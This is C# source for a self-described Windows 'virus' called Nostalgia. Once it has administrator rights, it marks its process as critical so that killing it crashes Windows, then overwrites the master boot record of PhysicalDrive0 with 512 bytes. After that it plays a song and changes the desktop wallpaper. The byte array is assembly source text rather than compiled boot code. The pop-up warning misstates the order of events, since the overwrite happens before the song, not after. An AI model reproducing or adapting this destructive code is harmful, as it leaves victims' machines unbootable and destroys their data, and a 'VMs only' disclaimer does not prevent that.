using System.Media;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using System.Drawing;
using System;
using System.Security.Principal;
using System.Diagnostics;


class MBROverwrite
{
    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateFile(
        string lpFileName, uint dwDesiredAccess, uint dwShareMode,
        IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

    [DllImport("kernel32")]
        private static extern bool WriteFile(
            IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);


    private const uint GenericRead = 0x80000000;
    private const uint GenericWrite = 0x40000000;
    private const uint GenericExecute = 0x20000000;
    private const uint GenericAll = 0x10000000;

    private const uint FileShareRead = 0x1;
    private const uint FileShareWrite = 0x2;
    private const uint OpenExisting = 0x3;

    private const uint MbrSize = 512;

    public static void OverWrite()
    {
        var mbrData = new byte[]
        {
            0x6F, 0x72, 0x67, 0x20, 0x30, 0x78, 0x37, 0x63, 0x30, 0x30, 0x0A, 0x62, 0x69, 0x74, 0x73, 0x20,
0x31, 0x36, 0x0A, 0x0A, 0x5F, 0x73, 0x74, 0x61, 0x72, 0x74, 0x3A, 0x0A, 0x20, 0x20, 0x20, 0x20,
0x6A, 0x6D, 0x70, 0x20, 0x6D, 0x61, 0x69, 0x6E, 0x0A, 0x0A, 0x6D, 0x61, 0x69, 0x6E, 0x3A, 0x0A,
0x20, 0x20, 0x20, 0x20, 0x63, 0x6C, 0x69, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x78, 0x6F, 0x72, 0x20,
0x61, 0x78, 0x2C, 0x20, 0x61, 0x78, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x6D, 0x6F, 0x76, 0x20, 0x64,
0x73, 0x2C, 0x20, 0x61, 0x78, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x6D, 0x6F, 0x76, 0x20, 0x65, 0x73,
0x2C, 0x20, 0x61, 0x78, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x6D, 0x6F, 0x76, 0x20, 0x73, 0x73, 0x2C,
0x20, 0x61, 0x78, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x6D, 0x6F, 0x76, 0x20, 0x73, 0x70, 0x2C, 0x20,
0x30, 0x78, 0x37, 0x63, 0x30, 0x30, 0x0A, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x6D, 0x6F, 0x76, 0x20,
0x73, 0x69, 0x2C, 0x20, 0x6D, 0x73, 0x67, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x63, 0x61, 0x6C, 0x6C,
0x20, 0x70, 0x72, 0x69, 0x6E, 0x74, 0x0A, 0x0A, 0x68, 0x61, 0x6E, 0x67, 0x3A, 0x0A, 0x20, 0x20,
0x20, 0x20, 0x6A, 0x6D, 0x70, 0x20, 0x68, 0x61, 0x6E, 0x67, 0x0A, 0x0A, 0x70, 0x72, 0x69, 0x6E,
0x74, 0x3A, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x6C, 0x6F, 0x64, 0x73, 0x62, 0x0A, 0x20, 0x20, 0x20,
0x20, 0x6F, 0x72, 0x20, 0x61, 0x6C, 0x2C, 0x20, 0x61, 0x6C, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x6A,
0x7A, 0x20, 0x64, 0x6F, 0x6E, 0x65, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x6D, 0x6F, 0x76, 0x20, 0x61,
0x68, 0x2C, 0x20, 0x30, 0x78, 0x30, 0x45, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x69, 0x6E, 0x74, 0x20,
0x30, 0x78, 0x31, 0x30, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x6A, 0x6D, 0x70, 0x20, 0x70, 0x72, 0x69,
0x6E, 0x74, 0x0A, 0x0A, 0x64, 0x6F, 0x6E, 0x65, 0x3A, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65,
0x74, 0x0A, 0x0A, 0x6D, 0x73, 0x67, 0x20, 0x64, 0x62, 0x20, 0x22, 0x4E, 0x6F, 0x73, 0x74, 0x61,
0x6C, 0x67, 0x69, 0x61, 0x20, 0x67, 0x6F, 0x74, 0x20, 0x79, 0x6F, 0x75, 0x2C, 0x20, 0x61, 0x6E,
0x64, 0x20, 0x79, 0x6F, 0x75, 0x20, 0x63, 0x61, 0x6E, 0x74, 0x20, 0x64, 0x6F, 0x20, 0x61, 0x6E,
0x79, 0x74, 0x68, 0x69, 0x6E, 0x67, 0x20, 0x61, 0x62, 0x6F, 0x75, 0x74, 0x20, 0x69, 0x74, 0x22,
0x2C, 0x20, 0x30, 0x0A, 0x74, 0x69, 0x6D, 0x65, 0x73, 0x20, 0x35, 0x31, 0x30, 0x20, 0x2D, 0x20,
0x28, 0x24, 0x2D, 0x24, 0x24, 0x29, 0x20, 0x64, 0x62, 0x20, 0x30, 0x0A, 0x64, 0x77, 0x20, 0x30,
0x78, 0x61, 0x61, 0x35, 0x35};
    var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero, OpenExisting, 0, IntPtr.Zero);
    WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
}
}
class ProcessHelper
{
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetInformationProcess(
        IntPtr hProcess,
        int processInfoClass,
        ref int processInfo,
        int processInfoLen);

    const int processBreakOnTermination = 0x1D;
    public static bool SetProcCrit(bool enable)
    {
        int isCrit = enable ? 1 : 0;
        IntPtr handle = Process.GetCurrentProcess().Handle;
        int ret = NtSetInformationProcess(handle, processBreakOnTermination, ref isCrit, sizeof(int));
        return ret == 0;
    }
}

class DesktopChanger
{
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool SystemParametersInfo(
        int uAction, int uParam, string lpvParam, int fuWinIni);

    const int SPI_SETDESKWALLPAPER = 20;
    const int SPIF_UPDATEINIFILE = 0X01;
    const int SPIF_SENDWININICHANGE = 0x02;

    public static void ChangeWallpaper(Image img)
    {
        string temp_path = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "wallpaper.bmp");

        img.Save(temp_path, System.Drawing.Imaging.ImageFormat.Bmp);
        bool result = SystemParametersInfo(
            SPI_SETDESKWALLPAPER, 0, temp_path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);

        if (!result)
        {
            MessageBox.Show("Error!", "Error while trying to change the wallpaper.", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }
}
namespace WARNING
{
    class WarningHandler
    {
        public static void ShowError()
        {
            MessageBox.Show(
                "Warning! This virus will overwrite the MBR after the song in the virus ends. Use it only in VMs and never in real-machines. I do not take responsability for any wrong or malicious usage.",
                "WARNING!",
                MessageBoxButtons.OK,
                MessageBoxIcon.Warning
            );
        }
    }
}

class AudioPlayer
{
    public static void Audio()
    {
        //FROM: https://soundcloud.com/walkzz/alan-walker-force
        var stream = Nostalgia.Properties.Resources.NOSTALGIA;

        if (stream == null)
        {
            MessageBox.Show("Errore: il file audio non è stato caricato.");
            return;
        }

        SoundPlayer player = new SoundPlayer(stream);
        player.PlaySync();
    }
}

class MAIN
{
    static bool isAdmin()
    {
        var identity = WindowsIdentity.GetCurrent();
        var principal = new WindowsPrincipal(identity);
        return principal.IsInRole(WindowsBuiltInRole.Administrator);

    }
    static void run()
    {
        WARNING.WarningHandler.ShowError();
        MBROverwrite.OverWrite();
        AudioPlayer.Audio();
        DesktopChanger.ChangeWallpaper(Nostalgia.Properties.Resources.wallpaper);
        Environment.Exit(0);
    }
    static void Main()
    {
        if (!MAIN.isAdmin())
        {
            MessageBox.Show("Please, restart this application with Administrator permissions!", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error);
            return;
        }
        else if (!ProcessHelper.SetProcCrit(true))
            {
                MessageBox.Show("Impossible to set critical process", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        else
        {
            run();
        }
    }
}
